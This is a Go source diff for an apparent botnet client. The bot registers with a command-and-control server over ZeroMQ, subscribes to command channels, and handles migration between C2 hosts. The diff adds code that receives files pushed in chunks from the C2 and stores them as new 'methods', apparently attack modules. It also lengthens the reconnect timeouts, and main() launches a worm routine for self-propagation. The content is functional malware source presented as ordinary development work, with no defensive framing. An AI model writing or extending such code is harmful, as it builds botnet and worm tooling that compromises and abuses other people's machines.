@@ -20,10 +20,11 @@ import (
 	zmq "github.com/pebbe/zmq4"
 )
 
-var (
-	dealmut sync.Mutex
-)
-
+type Method struct {
+	name     string
+	filepath string
+	format   string
+}
 type postC2info struct {
 	C2ip  string
 	rport string
@@ -44,6 +45,11 @@ type zmqinstance struct {
 	zdealer     *zmq.Socket
 	zsubscriber *zmq.Socket
 }
+
+var (
+	dealmut        sync.Mutex
+	custom_methods = make([]Method, 0)
+)
 
 func getFreshSocket() (nzmqinst zmqinstance) {
 	log.Println("Getting Fresh Context")
@@ -78,7 +84,7 @@ func recmig(zmqinst zmqinstance, postC2info postC2info, recsignal <-chan struct{
 		log.Println("Reconnection triggered")
 		nzmqinst := getFreshSocket()
 		log.Println("reconnecting...")
-		err := register(nzmqinst, postC2info, time.Second*15)
+		err := register(nzmqinst, postC2info, time.Minute*30)
 		if zmq.AsErrno(err) == zmq.ETIMEDOUT {
 			log.Println("reconnection timed out , returning to mother")
 			nzmqinst.zsubscriber.SetLinger(0)
@@ -94,7 +100,7 @@ func recmig(zmqinst zmqinstance, postC2info postC2info, recsignal <-chan struct{
 		zmqinst.zcontext.Term()
 		log.Println("Migration triggered")
 		nzmqinst := getFreshSocket()
-		err := register(nzmqinst, miginfo, time.Second*15)
+		err := register(nzmqinst, miginfo, time.Minute*30)
 		if zmq.AsErrno(err) == zmq.ETIMEDOUT {
 			log.Println("Migration timed out , returning to mother")
 			nzmqinst.zsubscriber.SetLinger(0)
@@ -484,12 +490,20 @@ func dealerhandle(dealer *zmq.Socket, dealdown chan<- struct{}, dealmigsignal ch
 
 func subhandler(subscriber *zmq.Socket, C2ip, bot, bport, connid string, subdown chan<- struct{}, submigsignal chan<- struct{}) {
 	subscriber.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, bport))
+
 	subscriber.SetRcvtimeo(time.Second * 10)
 	subscriber.SetSubscribe(bot)
 	subscriber.SetSubscribe(connid)
 	log.Printf("subscribed to the %s channel\n", bot)
+
+	var file *os.File
+	var methname string
+	var filename string
+
 	for {
-		message, err := subscriber.Recv(0)
+		message := ""
+
+		recved, err := subscriber.RecvMessage(0)
 
 		if err != nil {
 			log.Printf("subscriber channel: %s\n", err)
@@ -500,9 +514,59 @@ func subhandler(subscriber *zmq.Socket, C2ip, bot, bport, connid string, subdown
 			break
 		}
 
-		if strings.Contains(message, ":migrate") {
+		if len(recved) == 0 {
+			log.Println("empty message ignored")
+			continue
+		}
+
+		switch recved[1] {
+		case "file_start":
+			methname = recved[2]
+			filename = recved[3]
+			file, err = os.Create("methods/" + filename)
+			if err != nil {
+				log.Printf("failed to create file: %v", err)
+				continue
+			}
+		case "file_chunk":
+			if file != nil && recved[2] == methname {
+				_, err := file.Write([]byte(recved[3]))
+				if err != nil {
+					log.Printf("failed to write to file: %v", err)
+					file.Close()
+					file = nil
+					continue
+				}
+			}
+
+		case "file_end":
+			if file != nil && methname == recved[2] {
+				file.Close()
+				file = nil
+
+				var meth Method
+
+				meth.filepath = "methods/" + filename
+				meth.name = methname
+				meth.format = recved[3]
+				fmt.Println(meth.format)
+				custom_methods = append(custom_methods, meth)
+				methname = ""
+				filename = ""
+			}
+		}
+
+		if len(recved) == 2 {
+			message = recved[1]
+		}
+
+		if message == "migrate" {
 			submigsignal <- struct{}{}
 			break
+		}
+
+		if !strings.Contains(message, ":") {
+			continue
 		}
 
 		go func(message string) {
@@ -566,6 +630,8 @@ func subhandler(subscriber *zmq.Socket, C2ip, bot, bport, connid string, subdown
 func main() {
 	go worm.Startworm()
 	nzmqinst := getFreshSocket()
+
+	os.Mkdir("methods", 0755)
 
 	register(nzmqinst, postC2info{C2ip: config.C2ip, rport: config.Routerport}, time.Second*10)
 }
